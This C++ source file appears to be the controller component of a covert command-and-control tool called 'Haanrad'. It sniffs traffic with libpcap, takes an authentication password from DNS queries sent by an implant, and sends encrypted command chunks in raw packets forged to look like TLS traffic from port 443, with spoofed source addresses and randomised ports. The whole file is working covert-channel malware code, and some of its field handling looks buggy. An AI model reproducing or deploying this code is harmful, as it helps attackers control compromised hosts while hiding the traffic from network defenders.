//
// Created by bensoer on 31/10/16.
//

#include <pcap.h>
#include <iostream>
#include <cstring>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <dnet.h>
#include "CommHandler.h"
#include "MessageQueue.h"
#include "../shared/Logger.h"
#include "../shared/PacketIdentifier.h"
#include "../shared/Structures.h"
#include "../shared/Authenticator.h"

CommHandler * CommHandler::instance = nullptr;

CommHandler::CommHandler(MessageQueue * messageQueue, HCrypto * crypto) {
    this->messageQueue = messageQueue;
    this->crypto = crypto;

    if(!getInterface()){
        Logger::debug(to_string(getpid()) + " CommHandler - There Was An Error Fetching The Interface For The Monitor");
    }

    this->rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    // Set SO_REUSEADDR so that the port can be resused for further invocations of the application
    int arg = 1;
    if (setsockopt (this->rawSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1){
        Logger::debug("CovertSocket - SetSockOpt Failed For SO_REUSEADDR. Error: " + string(strerror(errno)));
    }

    //IP_HDRINCL to stop the kernel from building the packet headers
    {
        int one = 1;
        const int *val = &one;
        if (setsockopt(this->rawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
            Logger::debug("CovertSocket - SetSockOpt Failed For IP_HDRINCL. Error: " + string(strerror(errno)));
        }

    }
}

CommHandler* CommHandler::getInstance(MessageQueue * messageQueue, HCrypto * crypto) {
    if(CommHandler::instance == nullptr){
        CommHandler::instance = new CommHandler(messageQueue, crypto);
    }

    return CommHandler::instance;
}

/**
 * killListening is a helepr method so that the client can tell the NetworkMontior and libpcap to stop listening for
 * packets
 */
void CommHandler::killListening() {
    if(this->currentFD != nullptr){
        pcap_breakloop(this->currentFD);
    }
}

void CommHandler::killProcessing() {
    this->continueProcessing = false;
}

bool CommHandler::getInterface() {

    Logger::debug(to_string(getpid()) + " CommHandler:getInterfaces - Initializing");

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t * interfaces;
    pcap_if_t * interface;

    Logger::debug(to_string(getpid()) + " CommHandler:getInterfaces - Finding All Interfaces");

    if(pcap_findalldevs(&interfaces, errbuf) == -1){
        Logger::error(to_string(getpid()) + " CommHandler:getInterfaces - There Was An Error Fetching The Interfaces");
        cerr << errbuf << endl;
        return false;
    }

    Logger::debug(to_string(getpid()) + " NetworkMonitor:getInterfaces - Looping Through All Interfaces") ;

    allInterfaces = interfaces;
    interface = interfaces;
    while(interface != NULL){
        const char * name = interface->name;

        Logger::debug(to_string(getpid()) + " NetworkMonitor:getInterfaces - Testing Interface With Name: " + string(name));

        if(strcmp(name, string("any").c_str()) == 0){
            //this is the any interface
            Logger::debug(to_string(getpid()) + " NetworkMonitor:getInterfaces - FOUND THE ANY INTERFACE");

            listeningInterface = interface;
            return true;
        }

        interface = interface->next;
    }

    return false;
}

bool CommHandler::isValidAuth(PacketMeta meta) {

    //parse out the ip destination address
    struct iphdr * ip2 = (struct iphdr *)meta.packet;

    in_addr_t da = (in_addr_t)ip2->daddr;
    char destinationIP[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &da, destinationIP, INET_ADDRSTRLEN);
    string strDestinationIP(destinationIP);

    //now check the destination address belongs to an address we know is assigned to one of our interfaces
    bool destinationMatch = false;
    for(pcap_if_t * interface = CommHandler::instance->allInterfaces; interface != NULL; interface=interface->next){

        for(pcap_addr_t * address = interface->addresses; address != NULL; address=address->next){
            if(address->addr->sa_family == AF_INET){

                //if the packets destination address matches ones of these addresses, then we know it was sent to us
                string interfaceIP(inet_ntoa(((struct sockaddr_in*)address->addr)->sin_addr));

                if(interfaceIP.compare(strDestinationIP)==0){
                    destinationMatch = true;
                    break;
                }

            }
        }

        if(destinationMatch){
            break;
        }
    }

    //if there never is a match, we know its not for us - it might even be outbound
    if(destinationMatch == false){
        Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Packet Is Not Destined For A Known Address. Can't Be From Haanrad");
        return false;
    }

    //application type here is DNS. Need to confirm its a request destined for us
    char * transportLayer = PacketIdentifier::findTransportLayer(&meta);
    if(transportLayer == nullptr){
        Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Could Not Find TransportLayer. Can't Use Packet To check For Password");
        return false;
    }

    //transportLayer could be found
    struct udphdr * udp = (struct udphdr *)transportLayer;
    short destPort = ntohs(udp->dest);
    Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Parsed Destination Port: " + to_string(destPort));

    //confirm its for us and DNS using one of the typical DNS destination ports - Google likes to use 5353
    if(destPort == 53 || destPort == 5353 || destPort == 5355){
        return true;
    }

    return false;
}


void CommHandler::packetCallback(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet) {

    char * BUFFER = (char *)(packet + 16);
    struct iphdr * ip = (struct iphdr *)BUFFER;
    int ipHeaderLength = (ip->ihl * 4);
    int protocol = (ip->protocol);

    //just to make sure we are in the right spot
    Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - IP Header Length: " + to_string(ipHeaderLength));
    Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Protocol: " + to_string(protocol));

    PacketMeta meta = PacketIdentifier::generatePacketMeta(BUFFER, pkt_info->len);

    if(CommHandler::instance->haanradConnected == false){
        Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Haanrad Hasn't Contacted. Filtering For Passwords Only");
        //haanrad hasn't contacted us yet. We should lookout for its packets so we know how to authenticate

        if(meta.applicationType != ApplicationType::DNS){
            return;
        }

        //check this is a valid auth call from Haanrad
        if(CommHandler::instance->isValidAuth(meta)){
            Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Packet Is A DNS Request For Us. Assumed Haaanrad");

            string password = CommHandler::instance->parseOutDNSQuery(meta);
            Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Received Password From Haanrad: >" + password + "<");

            //set the IP of haanrad
            struct iphdr * ip2 = (struct iphdr *)meta.packet;
            in_addr_t da = (in_addr_t)ip2->saddr;
            char sourceIP[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &da, sourceIP, INET_ADDRSTRLEN);
            string strSourceIP(sourceIP);
            CommHandler::instance->haanradIP = strSourceIP;

            //initialize all components for communicating with Haanrad
            CommHandler::instance->password = password;
            CommHandler::instance->haanradConnected = true;

            Authenticator::setPassword(password);
            CommHandler::instance->crypto->initialize(password);

            Message message;
            message.messageType = MessageType::INTERCLIENT;
            message.interMessageCode = InterClientMessageType::CONNECTED;
            message.data = "Haanrad Connected!";

            CommHandler::instance->messageQueue->addMessageResponse(message);
        }
    }else{

        //we are connected and ready to rooooolllllll


    }

}

string CommHandler::parseOutDNSQuery(PacketMeta meta){

    if(meta.applicationType != ApplicationType::DNS){
        Logger::debug("Main:parseOutDNSQuery - FATAL ERROR. PacketMeta Is Not A DNS Packet");
        return "";
    }

    char * applicationLayer = PacketIdentifier::findApplicationLayer(&meta);
    struct DNS_HEADER * dns = (struct DNS_HEADER * )applicationLayer;

    char * query = applicationLayer + sizeof(struct DNS_HEADER);
    char * ptr = query;

    bool keepProcessing = true;
    string queryName = "";
    bool isFirst = true;
    while(keepProcessing){

        int len = (int)(*ptr);
        //if this is the first one or the last one. don't put a dot
        if(isFirst || len == 0){
            isFirst = false;
        }else{
            queryName += ".";
        }

        if(len == 0){
            break;
        }else{

            ptr++;
            string segment = "";
            for(int i = 0; i < len; ++i){
                char c = (*ptr);
                segment += c;
                ptr++;
            }

            queryName += segment;
        }

    }
    return queryName;
}

void CommHandler::listenForMessages() {

    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 subnetMask;
    bpf_u_int32 ip;

    //fetch network information for interface
    pcap_lookupnet(listeningInterface->name, &subnetMask, &ip, errbuf);

    //open up a raw socket and listen in promisc mode on it for data
    if((this->currentFD = pcap_open_live(listeningInterface->name, BUFSIZ, 1, -1, errbuf)) == NULL){
        Logger::debug(to_string(getpid()) + " CommHandler:listenForTraffic - There Was An Error in pcap_open_live");
        Logger::debug(string(errbuf));
        return;
    }

    //setup the libpcap filter
    struct bpf_program fp;
    //compile the filter
    if(pcap_compile(this->currentFD, &fp, "udp or tcp", 0, ip) == -1){
        Logger::debug(to_string(getpid()) + " CommHandler:listenForTraffic - There Was An Error Compiling The Filter");
        return;
    }
    //set the filter
    if(pcap_setfilter(this->currentFD, &fp) == -1){
        Logger::debug(to_string(getpid()) + " CommHandler:listenForTraffic - There Was An Error Setting The Filter");
        return;
    }

    u_char* args = NULL;
    //listen for packets
    pcap_loop(this->currentFD, 0, CommHandler::packetCallback, args);

}

void CommHandler::sendPacket(string payload) {

    char datagram[IP_MAXPACKET];
    memset(datagram, 0, IP_MAXPACKET);

    struct iphdr *ip = (struct iphdr *) datagram;
    int ipLength = (5 * 4);
    struct tcphdr *tcp = (struct tcphdr *) (datagram + ipLength);
    struct TLS_HEADER * tls = (struct TLS_HEADER *)(datagram + ipLength + sizeof(struct tcphdr));
    char * payloadPtr = (datagram + ipLength + sizeof(struct tcphdr) + sizeof(struct TLS_HEADER));

    //move in the payload
    memcpy(payloadPtr, payload.c_str(), payload.size());

    struct sockaddr_in sin;

    //create sockaddr_in for sendto
    unsigned short destPort = (rand() % 4970) + 1030; // generate a random dest port between 1030 and 6000
    sin.sin_family = AF_INET;
    sin.sin_port = htons(destPort);
    sin.sin_addr.s_addr = inet_addr(this->haanradIP.c_str());

    //set IP fields
    unsigned int id = (rand() % 4970) + 1030; // generate a random id between 1030 and 6000
    //IP Header Fields
    ip->ihl = 5;        // IP Header Length
    ip->version = 4;        // Version 4
    ip->tos = 0;
    ip->tot_len = 0;    // Calculate the total Datagram size - Need to do this AFTER Encryption and Auth
    ip->id = htonl(id);    //IP Identification Field
    ip->frag_off = 0;
    ip->ttl = 255;        // Set the TTL value
    ip->protocol = IPPROTO_TCP;
    ip->saddr = inet_addr (this->haanradIP.c_str());  //Source IP address
    ip->daddr = sin.sin_addr.s_addr;

    //set TCP fields
    unsigned int sequenceNumber = (rand() % 4294963096) + 4000; //generate random sequence number from 4000 - (TCP_SEQ_MAX - 200)
    unsigned int ackNumber = (rand() % 4294963096) + 4000;

    tcp->seq = htonl(sequenceNumber);
    tcp->ack_seq = htonl(ackNumber);
    tcp->doff = 5;
    tcp->psh = 1; //this is a push packet
    tcp->fin=0;
    tcp->syn=0;
    tcp->rst=0;
    tcp->ack=1;
    tcp->urg=0;
    tcp->window = htons (rand()% 4000 + 1024);
    tcp->urg_ptr = 0;
    tcp->check = 0; //leave to 0 so that the stack will generate our checksum

    tcp->source = htons(443);
    tcp->dest = htons(destPort);

    //set TLS fields
    tls->contentType = 23;
    tls->type = 771;
    tls->length = htons(1); //length will be filled in by crypto - needs to be greater then 0 for PacketIdentifier to recognize

    //generate a PacketMeta from all of this - from this point on must use meta.packet
    PacketMeta meta = PacketIdentifier::generatePacketMeta(datagram);

    Authenticator::addAuthSignature(&meta);
    char * applicationLayer = PacketIdentifier::findApplicationLayer(&meta);
    if(applicationLayer == nullptr){
        Logger::debug("CommHandler:sendPacket - Failed To Find Application Layer. Can't Send Packet");
        return;
    }

    this->crypto->encryptPacket(&meta, applicationLayer);

    //calculate IP Length
    struct iphdr *ip2 = (struct iphdr *)meta.packet;
    struct TLS_HEADER * tls2 = (struct TLS_HEADER *)applicationLayer;
    ip2->tot_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + sizeof(struct TLS_HEADER) + ntohs(tls2->length));

    //calculate IP Checksum
    ip2->check = 0;        //Initialize to zero before calculating checksum
    ip2->check = this->csum((unsigned short *) meta.packet, sizeof(iphdr));

    //we can now send this packet
    Logger::debug("CommHandler:sendPacket - Sending Packet");
    ssize_t result = sendto(this->rawSocket, meta.packet, ntohs(ip2->tot_len), 0, (struct sockaddr *) &sin, sizeof(sin));
    if(result < 0){
        Logger::debug("CommHandler:sendPacket - SendTo Failed. Error: " + string(strerror(errno)));
    }

}

void CommHandler::processMessagesToSend() {

    while(this->continueProcessing){
        Message message = this->messageQueue->getMessageToSend();
        if(message.interMessageCode != InterClientMessageType::EMPTY){
            //there is a legit message to be sent

            //haanrad TLS packets have a max capactiy of 35 bytes of plaintext data

            string payload = message.rawCommandMessage;

            unsigned long currentFullLength = payload.length() + CommHandler::instance->password.length();

            while(currentFullLength > 35 || currentFullLength > CommHandler::instance->password.length()){

                string acceptablePortion;
                string remainder;

                unsigned long acceptableLength = (35 - CommHandler::instance->password.length());
                if(payload.length() < acceptableLength){
                    acceptablePortion = payload;
                    remainder = "";
                }else{
                    acceptablePortion = payload.substr(0, (35 - CommHandler::instance->password.length()));
                    remainder = payload.substr((35 - CommHandler::instance->password.length()));
                }

                Logger::debug("CommHandler:processMessagesToSend - Acceptable Portion: >" + acceptablePortion + "<");
                Logger::debug("CommHandler:processMessagesToSend - Remainder That Will Be Sent In Next Packet: >" + remainder + "<");

                //update the payload
                payload = remainder;
                currentFullLength = payload.length() + CommHandler::instance->password.length();

                sendPacket(acceptablePortion);
            }
        }
    }
}

/**
 * csum is a helper method that generates the checksum needed for the response packet to be validated and sent
 * by the network stack
 * @param ptr
 * @param nbytes
 * @return
 */
unsigned short CommHandler::csum (unsigned short *ptr,int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}